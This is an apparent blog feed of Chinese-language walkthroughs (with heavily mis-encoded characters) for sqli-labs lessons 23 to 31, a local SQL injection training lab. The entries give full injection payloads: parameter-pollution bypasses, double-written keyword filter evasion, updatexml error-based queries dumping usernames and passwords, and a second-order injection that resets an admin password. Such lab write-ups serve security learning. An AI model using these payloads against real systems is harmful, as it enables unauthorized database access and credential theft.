    <content type="html"><![CDATA[<h1 id="backgroundï¼š"><a href="#backgroundï¼š" class="headerlink" title="backgroundï¼š"></a>backgroundï¼š</h1><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯webåº”ç”¨çš„åŸºæœ¬æ¶æ„ï¼š</p><p><img src="/lesson29/2.png" alt="2"></p><p>lesson29è¿™å…³ä¸­ï¼ŒæœåŠ¡ç«¯webåº”ç”¨æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ä»¥tomcatä¸ºå¼•æ“çš„jspå‹æœåŠ¡å™¨ï¼Œä¸€ä¸ªæ˜¯ä»¥apacheä¸ºå¼•æ“çš„phpå‹æœåŠ¡å™¨ï¼š</p><p><img src="/lesson29/1675852-20190529114341522-1690756767.png" alt="img"></p><p><strong>æ‰“å¼€indexjspæŸ¥çœ‹æºç ï¼š</strong></p><p><img src="/lesson29/5.png" alt="5"></p><p>æ–¹æ¡†å†…æ‰§è¡Œçš„æ˜¯åˆ¤æ–­tomcatè·å–çš„idæ˜¯å¦ä¸ºçº¯æ•°å­—ã€‚</p><p>æ¥ç€ï¼Œå¦‚æœidæ˜¯çº¯æ•°å­—ï¼Œå®ƒâ€œç¡®è®¤å®‰å…¨â€ï¼Œå°±ä¼šæŠŠè¾“å…¥ä¼ é€’ç»™apacheæœåŠ¡å™¨ã€‚</p><p>è¿™è¿‡ç¨‹ä¸­tomcatçš„ä½œç”¨å°±ç›¸å½“äºä¸€é“wafï¼ˆé˜²ç«å¢™ï¼‰ã€‚é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆç»•è¿‡è¿™ä¸ªé˜²ç«å¢™å‘¢ï¼Ÿ</p><p>æ‚‰çŸ¥ï¼Œå¤§å¤šæ•°æœåŠ¡å™¨å¯¹å‚æ•°çš„è§£æï¼š</p><p><img src="/lesson29/3.png" alt="3"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“é‡åˆ°å¤šä¸ªå‚æ•°æ—¶ï¼Œtomcatåªä¼šè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œä¸Šè¿°å¤„ç†ï¼Œåªè¦ç¬¬ä¸€ä¸ªå‚æ•°å¤åˆå®ƒçš„è¦æ±‚ï¼Œtomcatå°±ä¼šæŠŠæˆ‘ä»¬çš„è¾“å…¥ä¼ é€’åˆ°ä¸‹ä¸€çº§ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œæ„é€ å¤šä¸ªå‚æ•°æ¥è¾¾åˆ°ç›®çš„ã€‚</p><h1 id="lesson29ï¼š"><a href="#lesson29ï¼š" class="headerlink" title="lesson29ï¼š"></a>lesson29ï¼š</h1><h2 id="çˆ†åº“ï¼š"><a href="#çˆ†åº“ï¼š" class="headerlink" title="çˆ†åº“ï¼š"></a>çˆ†åº“ï¼š</h2><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,database()--+</span><br></pre></td></tr></table></figure><h2 id="çˆ†è¡¨ï¼š"><a href="#çˆ†è¡¨ï¼š" class="headerlink" title="çˆ†è¡¨ï¼š"></a>çˆ†è¡¨ï¼š</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure><h2 id="çˆ†åˆ—ï¼š"><a href="#çˆ†åˆ—ï¼š" class="headerlink" title="çˆ†åˆ—ï¼š"></a>çˆ†åˆ—ï¼š</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure><h2 id="çˆ†å€¼ï¼š"><a href="#çˆ†å€¼ï¼š" class="headerlink" title="çˆ†å€¼ï¼š"></a>çˆ†å€¼ï¼š</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h1 id="lesson30ï¼š"><a href="#lesson30ï¼š" class="headerlink" title="lesson30ï¼š"></a>lesson30ï¼š</h1><p>æ³¨å…¥ç±»å‹ï¼š<code>&quot;</code>  ï¼Œå…¶ä½™ä¸€æ ·ã€‚</p><h1 id="lesson31ï¼š"><a href="#lesson31ï¼š" class="headerlink" title="lesson31ï¼š"></a>lesson31ï¼š</h1><p>æ³¨å…¥ç±»å‹ï¼š<code>&quot;)</code>  ï¼Œå…¶ä½™ä¸€æ ·ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;backgroundï¼š&quot;&gt;&lt;a href=&quot;#backgroundï¼š&quot; class=&quot;headerlink&quot; title=&quot;backgroundï¼š&quot;&gt;&lt;/a&gt;backgroundï¼š&lt;/h1&gt;&lt;p&gt;é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯webåº”ç”¨çš„åŸºæœ¬æ¶æ„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson25-28a</title>
    <link href="http://example.com/2021/02/04/lesson25-28a/"/>
    <id>http://example.com/2021/02/04/lesson25-28a/</id>
    <published>2021-02-04T08:26:27.000Z</published>
    <updated>2021-02-06T05:25:27.537Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lesson25ï¼š"><a href="#lesson25ï¼š" class="headerlink" title="lesson25ï¼š"></a>lesson25ï¼š</h2><p>è¿™ä¸€å…³å®ƒå‘Šè¯‰æˆ‘ä»¬andå’Œoréƒ½è¢«è¿‡æ»¤äº†ã€‚</p><p>ä¸€èˆ¬ï¼Œç»•å¼€è¿‡æ»¤çš„æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><p>ï¼ˆ1ï¼‰å¤§å°å†™å˜å½¢ Or,OR,oR </p><p>ï¼ˆ2ï¼‰ç¼–ç ï¼Œhexï¼Œurlencode </p><p>ï¼ˆ3ï¼‰æ·»åŠ æ³¨é‡Š/<em>or</em>/ </p><p>ï¼ˆ4ï¼‰åˆ©ç”¨ç¬¦å· and=&amp;&amp;ï¼Œor=||</p><p>ï¼ˆ5ï¼‰æ„é€ å­—ç¬¦ä¸²â€”â€”oorrï¼Œanandd</p><p>æˆ‘ä»¬æŸ¥çœ‹æºç ï¼š</p><p><img src="/lesson25/1.png" alt="1"></p><p>è¿™é‡Œçš„orå’Œandé‡‡ç”¨äº†iæ­£åˆ™åŒ¹é…ï¼Œå¤§å°å†™éƒ½æ— æ³•ç»•è¿‡ã€‚</p><p>{               <strong>æ‹“å±•ä¸€ä¸‹PHPæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼ä¿®é¥°ç¬¦</strong></p><ul><li>i</li></ul><p>â€‹       å¦‚æœè®¾å®šæ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å­—ç¬¦å°†åŒæ—¶åŒ¹é…å¤§å°å†™å­—æ¯ã€‚</p><ul><li><p>m<br>å½“è®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œâ€œè¡Œèµ·å§‹â€å’Œâ€œè¡Œç»“æŸâ€é™¤äº†åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²å¼€å¤´å’Œç»“æŸå¤–ï¼Œè¿˜åˆ†åˆ«åŒ¹é…å…¶ä¸­çš„æ¢è¡Œç¬¦çš„ä¹‹åå’Œä¹‹å‰ã€‚</p></li><li><p>s<br>å¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„åœ†ç‚¹å…ƒå­—ç¬¦ï¼ˆ.ï¼‰åŒ¹é…æ‰€æœ‰çš„å­—ç¬¦ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ã€‚æ²¡æœ‰æ­¤è®¾å®šçš„è¯ï¼Œåˆ™ä¸åŒ…æ‹¬æ¢è¡Œç¬¦ã€‚</p></li><li><p>x<br>å¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„ç©ºç™½å­—ç¬¦é™¤äº†è¢«è½¬ä¹‰çš„æˆ–åœ¨å­—ç¬¦ç±»ä¸­çš„ä»¥å¤–å®Œå…¨è¢«å¿½ç•¥ï¼Œåœ¨æœªè½¬ä¹‰çš„å­—ç¬¦ç±»ä¹‹å¤–çš„ #ä»¥åŠä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸¤å¤´ï¼Œä¹Ÿéƒ½è¢«å¿½ç•¥ã€‚</p></li></ul><p>}</p><p><strong>é‚£ä¹ˆè¿™å…³æˆ‘ä»¬å°±ä»¥åŒå†™ç»•è¿‡çš„æ–¹å¼ä¸ºä¾‹ã€‚</strong></p><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>ä»ä¸­å¾—çŸ¥è¿™å…³ä¸ºå•å¼•å·ç±»å‹æ³¨å…¥ã€‚</p><p>å½“è¾“å…¥?id=1æ—¶ï¼Œé¡µé¢æœ‰å›æ˜¾ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨unionè”åˆæ³¨å…¥ã€‚</p><h3 id="çˆ†åº“"><a href="#çˆ†åº“" class="headerlink" title="çˆ†åº“:"></a>çˆ†åº“:</h3><p>è¾“å…¥ï¼š?id=0â€™  union select 1,2,database()â€“+</p><p>å¾—ï¼Œ<img src="/lesson25/2.png" alt="2"></p><h3 id="çˆ†è¡¨ï¼š"><a href="#çˆ†è¡¨ï¼š" class="headerlink" title="çˆ†è¡¨ï¼š"></a>çˆ†è¡¨ï¼š</h3><p>è¾“å…¥ï¼š?id=0â€™ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where </p><p>table_schema=â€™securityâ€™â€“+</p><p>å¾—ï¼Œ<img src="/lesson25/3.png" alt="3"></p><p>æ³¨ï¼šinformationä¸­ä¹Ÿå«æœ‰orï¼Œå› æ­¤ä¹Ÿéœ€è¦åšç»•è¿‡å¤„ç†ã€‚</p><h3 id="çˆ†åˆ—ï¼š"><a href="#çˆ†åˆ—ï¼š" class="headerlink" title="çˆ†åˆ—ï¼š"></a>çˆ†åˆ—ï¼š</h3><p>è¾“å…¥ï¼š?id=0â€™ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where </p><p>table_schema=â€™securityâ€™â€“+</p><p>å¾—ï¼Œ<img src="/lesson25/4.png" alt="4"></p><h3 id="çˆ†å€¼ï¼š"><a href="#çˆ†å€¼ï¼š" class="headerlink" title="çˆ†å€¼ï¼š"></a>çˆ†å€¼ï¼š</h3><p>è¾“å…¥ï¼š?id=0â€™ union select 1,2,group_concat(username,0x3a,passwoorrd) from usersâ€“+</p><p>å¾—ï¼Œ<img src="/lesson25/5.png" alt="5"></p><p>æ³¨ï¼špasswordä¸­ä¹Ÿå«æœ‰orï¼Œå› æ­¤ä¹Ÿéœ€è¦åšç»•è¿‡å¤„ç†ã€‚</p><h2 id="lesson25a"><a href="#lesson25a" class="headerlink" title="lesson25a:"></a>lesson25a:</h2><p>å’Œlesson25æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œæ³¨æ„æ³¨å…¥ç±»å‹å°±å¥½äº†ã€‚</p><h2 id="lesson26ï¼š"><a href="#lesson26ï¼š" class="headerlink" title="lesson26ï¼š"></a>lesson26ï¼š</h2><p>æŸ¥çœ‹æºç ï¼š<img src="/lesson25/6.png" alt="6"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒå°±è¿‡æ»¤äº†ä¸€å †å­—ç¬¦ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨<strong>URLç¼–ç </strong>ç»•è¿‡è¿™äº›è¿‡æ»¤ï¼š</p><p>+       URL ä¸­+å·è¡¨ç¤ºç©ºæ ¼                 %2B<br>ç©ºæ ¼  URLä¸­çš„ç©ºæ ¼å¯ä»¥ç”¨+å·æˆ–è€…ç¼–ç       %20<br>/        åˆ†éš”ç›®å½•å’Œå­ç›®å½•                   %2F<br>?        åˆ†éš”å®é™…çš„URLå’Œå‚æ•°               %3F<br>%       æŒ‡å®šç‰¹æ®Šå­—ç¬¦                     %25<br>#       è¡¨ç¤ºä¹¦ç­¾                         %23<br>&amp;       URL ä¸­æŒ‡å®šçš„å‚æ•°é—´çš„åˆ†éš”ç¬¦         %26<br>=        URL ä¸­æŒ‡å®šå‚æ•°çš„å€¼                %3D</p><p>æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆç©ºæ ¼æˆ‘ä¸€ç›´æ‰¾ä¸åˆ°ç»•å¼€çš„æ–¹æ³•ï¼Œä¸Šé¢çš„å‡ ç§éƒ½ä¸è¡Œï¼Œå¥½åƒæ˜¯apacheçš„é—®é¢˜ï¼Œè¦æˆ‘ä»¬ç”¨linuxç³»ç»Ÿæ‰èƒ½ç»•è¿‡ã€‚æ—¢ç„¶è¿™æ ·æˆ‘ä»¬åªèƒ½é¿å…è¾“å…¥ç©ºæ ¼äº†ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥â€”â€”</p><h3 id="çˆ†åº“ï¼š"><a href="#çˆ†åº“ï¼š" class="headerlink" title="çˆ†åº“ï¼š"></a>çˆ†åº“ï¼š</h3><p>è¾“å…¥ï¼š?id=1â€™||updatexml(1,concat(â€˜~â€™,database()),1)||â€™1â€™=â€™1</p><p>å¾—ï¼Œ<img src="/lesson25/7.png" alt="7"></p><h3 id="çˆ†è¡¨ï¼š-1"><a href="#çˆ†è¡¨ï¼š-1" class="headerlink" title="çˆ†è¡¨ï¼š"></a>çˆ†è¡¨ï¼š</h3><p>è¾“å…¥ï¼š?id=1â€™||updatexml(1,concat(â€˜~â€™,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=â€™securityâ€™))),1)||â€™1â€™=â€™1</p><p>å¾—ï¼Œ<img src="/lesson25/8.png" alt="8"></p><h3 id="çˆ†åˆ—ï¼š-1"><a href="#çˆ†åˆ—ï¼š-1" class="headerlink" title="çˆ†åˆ—ï¼š"></a>çˆ†åˆ—ï¼š</h3><p>è¾“å…¥ï¼š?id=1â€™||updatexml(1,concat(â€˜~â€™,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=â€™usersâ€™anandd(table_schema=â€™securityâ€™)))),1)||â€™1â€™=â€™1</p><p>å¾—ï¼Œ<img src="/lesson25/9.png" alt="9"></p><h3 id="çˆ†å€¼ï¼š-1"><a href="#çˆ†å€¼ï¼š-1" class="headerlink" title="çˆ†å€¼ï¼š"></a>çˆ†å€¼ï¼š</h3><p>è¾“å…¥ï¼š?id=1â€™||updatexml(1, concat(0x7e,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from(security.users))) ,1)||â€™1â€™=â€™1</p><p>å¾—ï¼Œ<img src="/lesson25/10.png" alt="10"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œlimitå› ä¸ºè¿‡æ»¤å› ç´ ç”¨ä¸äº†ï¼Œå¾ˆéš¾å—ï¼Œè€Œä¸”æŠ¥é”™é•¿åº¦åˆæœ‰é™ï¼Œé‚£ä¹ˆè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶idçš„å€¼æ¥ä¸€ä¸ªä¸ªæŸ¥è¯¢ï¼Œä¾‹å¦‚è¾“å…¥ï¼š?id=1â€™ || updatexml(1, concat(0x7e, (select (group_concat(  concat_ws(0x7e,username,passwoorrd)  )) from (security.users)  where(id=5))) ,1)  || â€˜1â€™=â€™1</p><h2 id="lesson26aï¼š"><a href="#lesson26aï¼š" class="headerlink" title="lesson26aï¼š"></a>lesson26aï¼š</h2><p>å½“æˆ‘ä»¬è¾“å…¥å¯¼è‡´sqlè¯­æ³•é”™è¯¯çš„æ—¶å€™ï¼Œä¸ä¼šå›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ— æ³•ä½¿ç”¨æŠ¥é”™æ³¨å…¥äº†ã€‚</p><h2 id="lesson27ï¼š"><a href="#lesson27ï¼š" class="headerlink" title="lesson27ï¼š"></a>lesson27ï¼š</h2><p>åŒlesson26ï¼ŒæŠ¥é”™æ³¨å…¥ã€‚</p><p>æºç ï¼š</p><p><img src="/lesson25/11.png" alt="11"></p><ul><li><p>è‹¥æƒ³ä½¿ç”¨unionè”åˆæ³¨å…¥ï¼Œåªéœ€è¦å°† union å’Œ select æ”¹ä¸ºå¤§å°å†™æ··åˆå°±å¯ä»¥äº†ã€‚</p></li><li><p>è¿™å…³å–æ¶ˆäº†å¯¹andå’Œorçš„è¿‡æ»¤ã€‚</p></li></ul><h2 id="lesson27aï¼š"><a href="#lesson27aï¼š" class="headerlink" title="lesson27aï¼š"></a>lesson27aï¼š</h2><p>ä¸èƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;lesson25ï¼š&quot;&gt;&lt;a href=&quot;#lesson25ï¼š&quot; class=&quot;headerlink&quot; title=&quot;lesson25ï¼š&quot;&gt;&lt;/a&gt;lesson25ï¼š&lt;/h2&gt;&lt;p&gt;è¿™ä¸€å…³å®ƒå‘Šè¯‰æˆ‘ä»¬andå’Œoréƒ½è¢«è¿‡æ»¤äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬ï¼Œç»•å¼€è¿‡æ»¤çš„æ–¹æ³•æœ‰ä»¥ä¸‹å‡ </summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson24</title>
    <link href="http://example.com/2021/02/03/lesson24/"/>
    <id>http://example.com/2021/02/03/lesson24/</id>
    <published>2021-02-03T13:07:57.000Z</published>
    <updated>2021-02-05T03:21:09.205Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lesson24ï¼š"><a href="#lesson24ï¼š" class="headerlink" title="lesson24ï¼š"></a>lesson24ï¼š</h2><p>è¿™å…³æ„Ÿè§‰å¾ˆæœ‰æ„æ€ã€‚ä»¥å¾€çš„SQLæ³¨å…¥éƒ½æ˜¯ä¸€é˜¶æ³¨å…¥ï¼Œè€Œè¿™ä¸€å…³å‡ºç°äº†äºŒé˜¶æ³¨å…¥ã€‚å…ˆä»‹ç»ä¸€ä¸‹äºŒé˜¶æ³¨å…¥ï¼š</p><p><strong>äºŒé˜¶æ³¨å…¥ä¹Ÿå«å­˜å‚¨å‹çš„æ³¨å…¥ï¼Œå°±æ˜¯å°†å¯èƒ½å¯¼è‡´ sql æ³¨å…¥çš„å­—ç¬¦å…ˆå­˜å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œå½“å†æ¬¡è°ƒç”¨è¿™ä¸ªæ¶æ„æ„é€ çš„å­—ç¬¦æ—¶ï¼Œå°±ä¼šè§¦å‘sql æ³¨å…¥</strong>ã€‚</p><p><img src="/lesson24/2.png" alt="2"></p><p>æˆ‘ä»¬å…ˆåœ¨é¡µé¢ä¸Šåšä¸€äº›è¯•æ¢ã€‚</p><ul><li>ç‚¹å‡»ï¼šForgot your passwordï¼Ÿ</li></ul><p>é¡µé¢è·³è½¬ï¼š<img src="/lesson24/1.png" alt="1"></p><p>å¤§æ„æ˜¯å¦‚æœä½ å¿˜äº†ä½ çš„å¯†ç ï¼Œå°±è‡ªå·±é»‘äº†ä»–ã€‚é‚£ä¹ˆæˆ‘ä»¬è‚¯å®šä¸èƒ½åœ¨è¿™é‡Œä¸‹æ‰‹äº†ã€‚</p><ul><li>ç‚¹å‡»ï¼šNew User click here?</li><li>é¡µé¢è·³è½¬ï¼š<img src="/lesson24/3.png" alt="3"></li></ul><p>æˆ‘ä»¬çœ‹åˆ°è¿™å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„æ³¨å†Œç•Œé¢ï¼Œæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œæˆ‘ä»¬å…ˆæš‚ä¸è¨€è¡¨ã€‚</p><p>æˆ‘ä»¬æ¥ç€è¯•æ¢ï¼Œè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼Œè¿›å…¥åˆ°ä¸€ä¸ªä¿®æ”¹å¯†ç çš„ç½‘é¡µï¼š</p><p><img src="/lesson24/4.png" alt="4"></p><p>ä¸çŸ¥é“å“ªä¸ªåœ°æ–¹å¯ä»¥æ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆ<strong>æ‰“å¼€loginçš„æºç ï¼š</strong></p><p><img src="/lesson24/6.png" alt="6"></p><p>å‘ç°ç™»å…¥é¡µé¢è¾“å…¥çš„è´¦å·å¯†ç éƒ½è¢«è½¬ä¹‰äº†ï¼Œé‚£ä¹ˆè‚¯å®šä¸èƒ½ç›´æ¥æ³¨å…¥ï¼Œæ¥ç€çœ‹ä»£ç ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&quot;username&quot;] = $login;</span><br></pre></td></tr></table></figure><p>å‘ç°å®ƒè®¾äº†ä¸€ä¸ªæ–°å˜é‡å‚¨å­˜ä»æ•°æ®åº“ä¸­é€‰æ‹©å‡ºæ¥çš„usernameçš„å€¼ã€‚</p><p><strong>æ‰“å¼€pass_changeçš„æºç ï¼š</strong><img src="/lesson24/5.png" alt="5"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºä»æ”¹å¯†ç çš„é¡µé¢æ³¨å…¥æ˜¯ä¸å¯è¡Œçš„äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ä»æ•°æ®åº“ä¸­é€‰æ‹©å‡ºæ¥çš„usernameæ²¡æœ‰è¢«å¤æŸ¥ï¼Œç›´æ¥æ„é€ æˆsqlè¯­å¥ï¼Œå¸¦å…¥åˆ°æ•°æ®åº“ä¸­ã€‚äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥æœ‰è¿™æ ·ä¸€ç§æ€è·¯ï¼Œæˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œä¾‹å¦‚ï¼šè´¦æˆ·ï¼šadminâ€™#ï¼ˆadminä¸ºç›®æ ‡ç”¨æˆ·åï¼‰ï¼Œå¯†ç ï¼š123ã€‚</p><p>ç„¶åæˆ‘ä»¬è¾“å…¥æˆ‘ä»¬æ³¨å†Œçš„è¿™ä¸ªè´¦å·å¯†ç ç™»å…¥ï¼Œè¿›å…¥ä¿®æ”¹å¯†ç é¡µé¢ï¼Œ</p><p>pass_changeçš„æºç ä¸­sqlè¯­å¥æ˜¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$curr_pass&#x27;</span> <span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>è€Œç™»å…¥æˆ‘ä»¬æ³¨å†Œçš„è´¦æˆ·åï¼Œsqlè¯­å¥è¢«ç¯¡æ”¹ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span><span class="comment">#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span></span><br><span class="line">ç›¸å½“äºï¼š</span><br><span class="line">$<span class="keyword">sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾¾åˆ°äº†æ— éœ€çŸ¥é“ç›®æ ‡è´¦æˆ·å¯†ç è€Œå¯ä»¥ä¿®æ”¹ç›®æ ‡è´¦æˆ·çš„å¯†ç ï¼Œè¿›è€Œé€šè¿‡ä¿®æ”¹çš„æ–°å¯†ç ç™»å…¥ç›®æ ‡è´¦æˆ·ã€‚</p><p><strong>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬è¾“å…¥çš„å•å¼•å·ä¸æ˜¯è¢«è½¬ä¹‰äº†å—ï¼Œé‚£å®ƒæ„é€ çš„sqlè¯­å¥æ€ä¹ˆè¿˜ä¼šèµ·ä½œç”¨å‘¢ï¼Ÿ</strong></p><p>åŸæ¥è½¬ä¹‰åªæ˜¯æš‚æ—¶çš„ï¼Œæ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“ä»¥åè¿˜æ˜¯ä»¥åŸå¥çš„å½¢å¼å­˜åœ¨ï¼Œåæ–œæ ä¸ä¼šéšä¹‹æ’å…¥æ•°æ®åº“ã€‚</p><p>æ³¨ï¼šæˆ‘å‘ç°è¿™æ ·æ³¨å…¥è¿˜æ˜¯å¾ˆæœ‰å±€é™æ€§çš„ï¼Œå› ä¸ºä½ åªèƒ½ä¸€ä¸ªä¸€ä¸ªå»ç ´è§£ï¼Œå¦‚æœé€šè¿‡æ³¨å†Œè´¦æˆ·æ—¶æ„é€ payloadï¼Œä¼šå—åˆ°å­—èŠ‚é•¿åº¦çš„é™åˆ¶ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;lesson24ï¼š&quot;&gt;&lt;a href=&quot;#lesson24ï¼š&quot; class=&quot;headerlink&quot; title=&quot;lesson24ï¼š&quot;&gt;&lt;/a&gt;lesson24ï¼š&lt;/h2&gt;&lt;p&gt;è¿™å…³æ„Ÿè§‰å¾ˆæœ‰æ„æ€ã€‚ä»¥å¾€çš„SQLæ³¨å…¥éƒ½æ˜¯ä¸€é˜¶æ³¨å…¥ï¼Œè€Œè¿™ä¸€å…³å‡ºç°äº†äºŒé˜¶æ³¨å…¥ã€‚å…ˆä»‹ç»ä¸€ä¸‹äºŒ</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson23</title>
    <link href="http://example.com/2021/02/03/lesson23/"/>
    <id>http://example.com/2021/02/03/lesson23/</id>
    <published>2021-02-03T10:52:07.000Z</published>
    <updated>2021-02-04T03:15:42.985Z</updated>
    
